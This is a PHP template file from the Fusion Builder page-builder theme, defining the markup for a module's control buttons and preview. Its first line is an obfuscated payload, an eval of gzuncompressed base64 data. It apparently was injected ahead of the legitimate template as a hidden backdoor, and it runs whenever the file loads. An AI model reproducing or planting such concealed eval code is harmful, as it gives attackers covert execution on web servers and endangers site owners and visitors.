<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><script type="text/template" id="fusion-builder-block-module-template">
	<div class="fusion-builder-module-controls-container">
		<div class="fusion-builder-controls fusion-builder-module-controls">
			<a href="#" class="fusion-builder-settings" title="{{ fusionBuilderText.element_settings }}"><span class="fusiona-pen"></span></a>
			<a href="#" class="fusion-builder-clone fusion-builder-clone-module" title="{{ fusionBuilderText.clone_element }}"><span class="fusiona-file-add"></span></a>
			<a href="#" class="fusion-builder-save fusion-builder-save-module-dialog" title="{{ fusionBuilderText.save_element }}"><span class="fusiona-drive"></span></a>
			<a href="#" class="fusion-builder-remove" title="{{ fusionBuilderText.delete_element }}"><span class="fusiona-trash-o"></span></a>
		</div>
	</div>
	<# if ( typeof( fusionAllElements[element_type].preview ) == 'undefined' ) { #>
		<span class="fusion-builder-module-title">
			<# if ( typeof( fusionAllElements[element_type].icon ) !== 'undefined' ) { #>
				<div class="fusion-module-icon {{ fusionAllElements[element_type].icon }}"></div>
			<# } #>
			{{ typeof( fusionAllElements[element_type].name ) !== 'undefined' ?  fusionAllElements[element_type].name : '' }}
		</span>
	<# } #>
	<div class="fusion-builder-module-preview"></div>
</script>
